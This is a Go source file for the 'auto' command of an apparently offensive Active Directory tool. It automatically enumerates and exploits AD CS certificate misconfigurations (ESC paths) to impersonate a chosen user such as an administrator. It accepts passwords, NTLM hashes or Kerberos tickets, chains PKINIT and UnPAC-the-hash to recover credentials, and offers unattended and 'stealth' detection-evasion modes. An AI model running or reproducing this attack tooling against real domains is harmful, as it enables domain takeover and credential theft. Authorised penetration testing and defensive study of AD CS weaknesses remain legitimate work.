package main

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"github.com/loudmumble/trusted/pkg/pki"
	"github.com/spf13/cobra"
)

var autoCmd = &cobra.Command{
	Use:   "auto",
	Short: "Auto-pwn — interactively enumerate and exploit ADCS",
	Long: `Interactively enumerate all ESC vulnerabilities, and exploit paths step-by-step.
AutoPwn streams findings as they are discovered and prompts for execution,
performing PKINIT and UnPAC-the-hash automatically upon success.

Examples:
  trusted auto --target-dc dc01 --domain contoso.com -u user -p pass --upn admin@contoso.com
  trusted auto --target-dc dc01 --domain contoso.com -u user -p pass --upn admin@contoso.com --auto-run`,
	RunE: func(cmd *cobra.Command, args []string) error {
		targetDC, _ := cmd.Flags().GetString("target-dc")
		domain, _ := cmd.Flags().GetString("domain")
		username, _ := cmd.Flags().GetString("username")
		password, _ := cmd.Flags().GetString("password")
		hash, _ := cmd.Flags().GetString("hash")
		kerberos, _ := cmd.Flags().GetBool("kerberos")
		ccache, _ := cmd.Flags().GetString("ccache")
		keytabPath, _ := cmd.Flags().GetString("keytab")
		kdcIP, _ := cmd.Flags().GetString("dc-ip")
		upn, _ := cmd.Flags().GetString("upn")
		attackerDN, _ := cmd.Flags().GetString("attacker-dn")
		victimDN, _ := cmd.Flags().GetString("victim-dn")
		outputDir, _ := cmd.Flags().GetString("output-dir")
		dryRun, _ := cmd.Flags().GetBool("dry-run")
		autoRun, _ := cmd.Flags().GetBool("auto-run")
		outputJSON, _ := cmd.Flags().GetBool("json")

		var oldStdout *os.File
		if outputJSON {
			oldStdout = os.Stdout
			devNull, _ := os.Open(os.DevNull)
			os.Stdout = devNull
			autoRun = true // strictly enforce auto-run if JSON is requested
		}

		if targetDC == "" || domain == "" {
			return fmt.Errorf("--target-dc and --domain are required")
		}
		if !kerberos && (username == "" || (password == "" && hash == "")) {
			return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or --hash <NT_HASH> or -k for Kerberos)")
		}
		if upn == "" {
			return fmt.Errorf("--upn is required (target user to impersonate, e.g. administrator@%s)", domain)
		}
		if !strings.Contains(upn, "@") {
			return fmt.Errorf("--upn must be a full UPN (user@domain), got %q — try %s@%s", upn, upn, domain)
		}
		if outputDir == "" {
			outputDir = "./out"
		}
		useTLS, _ := cmd.Flags().GetBool("ldaps")
		useStartTLS, _ := cmd.Flags().GetBool("start-tls")
		stealth, _ := cmd.Flags().GetBool("stealth")
		timeout, _ := cmd.Flags().GetInt("timeout")

		cfg := &pki.AutoPwnConfig{
			ADCSConfig: &pki.ADCSConfig{
				TargetDC: targetDC, Domain: domain,
				Username: username, Password: password, Hash: hash,
				Kerberos: kerberos, CCache: ccache, Keytab: keytabPath, KDCIP: kdcIP,
				UseTLS: useTLS, UseStartTLS: useStartTLS, Stealth: stealth,
				Timeout: timeout,
			},
			TargetUPN:   upn,
			AttackerDN:  attackerDN,
			VictimDN:    victimDN,
			OutputDir:   outputDir,
			DryRun:      dryRun,
			Interactive: !autoRun, // Default is interactive
		}

		result, err := pki.AutoPwn(context.Background(), cfg)

		if outputJSON {
			os.Stdout = oldStdout
			if err != nil {
				errResult := map[string]string{"error": err.Error()}
				data, _ := json.MarshalIndent(errResult, "", "  ")
				fmt.Println(string(data))
				return nil
			}
			if result == nil {
				res := map[string]string{"status": "no_exploitable_paths"}
				data, _ := json.MarshalIndent(res, "", "  ")
				fmt.Println(string(data))
				return nil
			}
			data, _ := json.MarshalIndent(result, "", "  ")
			fmt.Println(string(data))
			return nil
		}

		if err != nil {
			return err
		}

		if result == nil {
			fmt.Println("[*] No exploitable paths found (or dry-run completed)")
		}

		// PKINIT + UnPAC commands are already printed by AutoPwn()
		return nil
	},
}

func init() {
	rootCmd.AddCommand(autoCmd)

	autoCmd.Flags().String("target-dc", "", "Target domain controller")
	autoCmd.Flags().String("domain", "", "Active Directory domain")
	autoCmd.Flags().StringP("username", "u", "", "Domain username (user or user@domain)")
	autoCmd.Flags().StringP("password", "p", "", "Domain password")
	autoCmd.Flags().String("hash", "", "NTLM hash for pass-the-hash")
	autoCmd.Flags().BoolP("kerberos", "k", false, "Use Kerberos authentication (GSSAPI/SPNEGO)")
	autoCmd.Flags().String("ccache", "", "Path to Kerberos ccache file (default: KRB5CCNAME env)")
	autoCmd.Flags().String("keytab", "", "Path to Kerberos keytab file")
	autoCmd.Flags().String("dc-ip", "", "KDC IP address (if different from --target-dc)")
	autoCmd.Flags().String("upn", "", "Target UPN to impersonate (required)")
	autoCmd.Flags().String("attacker-dn", "", "Attacker's LDAP DN (needed for ESC9/10)")
	autoCmd.Flags().String("victim-dn", "", "Victim's LDAP DN (needed for ESC14)")
	autoCmd.Flags().String("output-dir", "./out", "Output directory for certs")
	autoCmd.Flags().Bool("dry-run", false, "Enumerate and plan only, don't exploit")
	autoCmd.Flags().Bool("auto-run", false, "Execute without interactive prompts (try best path automatically)")
	autoCmd.Flags().Bool("ldaps", false, "Use LDAPS (TLS on port 636)")
	autoCmd.Flags().Bool("start-tls", false, "Use StartTLS (upgrade on port 389)")
	autoCmd.Flags().Bool("stealth", false, "Stealth mode (jittered queries, small page sizes)")
	autoCmd.Flags().Int("timeout", 10, "Network timeout in seconds for LDAP/HTTP/RPC connections")
	autoCmd.Flags().Bool("json", false, "Output results as JSON instead of human-readable text")
}
